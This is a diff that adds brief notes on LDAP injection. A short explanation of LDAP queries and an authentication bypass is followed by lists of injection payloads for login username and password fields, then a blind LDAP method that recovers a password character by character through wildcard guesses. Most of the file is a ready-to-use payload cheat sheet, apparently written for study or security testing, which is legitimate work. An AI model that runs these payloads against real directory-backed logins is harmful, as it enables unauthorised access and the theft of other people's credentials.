@@ -1,0 +1,61 @@
+
+LDAP stands for Lightweight Directory Access Protocol.
+It is used to access and manage directory information, like:
+•	Usernames
+•	Passwords
+•	Email addresses
+•	Organizational data
+
+
+Example LDAP query: (&(uid=admin)(password=123456))
+
+
+This means:
+•	Find user where uid = admin
+•	AND password = 123456
+
+
+LDAP Injection occurs when user input is not properly sanitized and gets inserted directly into an LDAP query.
+
+
+If attacker enters: username: admin)(&)
+                                 password: anything
+The query becomes: (&(uid=admin)(&)(password=anything))
+This may bypass authentication.
+
+
+Payloads : 
+user = *)(uid=*))(|(uid=* | pass = password , 
+user = admin)(!(&(1=0 | pass = q))
+* | *
+*)(& | *)(&
+*)(|(& | pwd)
+*)(|(password=* | test)
+*))%00 | any
+admin)(&) | pwd
+admin)(!(&(| | any))
+* | *)(&
+admin))(|(| | any
+
+
+
+In username feild , password anything is fine
+*
+admin)(&)
+*)(uid=*
+admin)(|(uid=*))
+*)(|(uid=*))
+admin)(uid=*)
+*)(uid=*))(|(uid=*
+admin)(!(uid=admin))
+admin)(&(|(uid=*)))
+*)(|(objectClass=*))
+
+
+Bling LDAP 
+Administrator | M*           If response = OK, password starts with M.
+Administrator  | MY*           If OK, password starts with MY
+Administrator  | MYA*
+Administrator  | MYAB*   ……. Until full password is found.
+
+NOTE: attacker must provide a real username
